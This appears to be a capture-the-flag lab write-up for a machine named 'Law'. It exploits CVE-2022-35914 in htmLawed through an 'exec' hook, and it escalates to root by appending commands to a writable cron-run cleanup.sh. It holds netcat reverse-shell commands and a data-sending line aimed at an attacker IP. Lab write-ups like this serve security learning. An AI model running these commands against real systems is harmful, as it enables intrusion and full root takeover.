##### Tags: `cornjob`  `burp suite`  `github`  `script`  `CVE-2022-35914`

# 🐧Law🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.143.190
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 15:27 AEDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running HTMLAWED 1.2.5 TEST website  
found a way to exploit of github  
https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/

in the setting the name of hook function put exec
```console
hook: exec
```
the put id in the input box  
use burp suite to intercept the traffic   
```console
POST /htmLawedTest.php HTTP/1.1
Host: 192.168.143.190
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 839
Origin: http://192.168.143.190
Connection: keep-alive
Referer: http://192.168.143.190/
Cookie: sid=7o17fp2tp78819uiejhh67hf24
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
we got the output says the URL in not exist  
becuase it redirect us to /htmLawedTest.php which is not exist  
we delete the path
```console
POST / HTTP/1.1
```
forward the traffic and got the result
```console
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
put the reverse shell payload in the input section and process again
```console
nc -c sh 192.168.45.201 80

$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.143.190] 57248
www-data@law: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation 

there is a unusual file call cleanup.sh
```console
www-data@law:/var/www$ ls -la
total 20
drwxr-xr-x  3 root     root     4096 Aug 25  2023 .
drwxr-xr-x 12 root     root     4096 Aug 24  2023 ..
-rwxr-xr-x  1 www-data www-data  134 Feb  8 01:30 cleanup.sh
drwxr-xr-x  2 www-data www-data 4096 Feb  8 00:25 html
-rw-r--r--  1 www-data www-data   33 Feb  7 23:26 local.txt

www-data@law:/var/www$ cat cleanup.sh
#!/bin/bash
rm -rf /var/log/apache2/error.log
rm -rf /var/log/apache2/access.log
```
it looks like a bash script   
but we can access the log  
it could possibly run by root
```console
www-data@law:/var/www$ cat /var/log/apache2/error.log
cat: /var/log/apache2/error.log: Permission denied
www-data@law:/var/www$ cat /var/log/apache2/access.log
cat: /var/log/apache2/access.log: Permission denied
```
to test it we ask the script to send us the id output  
and it confirmed its running by root
```console
www-data@law:/var/www$ echo 'id | nc 192.168.45.201 8083' >> cleanup.sh

$ nc -lvnp 8083         
listening on [any] 8083 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.143.190] 60460
uid=0(root) gid=0(root) groups=0(root)
```
just simply add a reverse payload and get the root shell
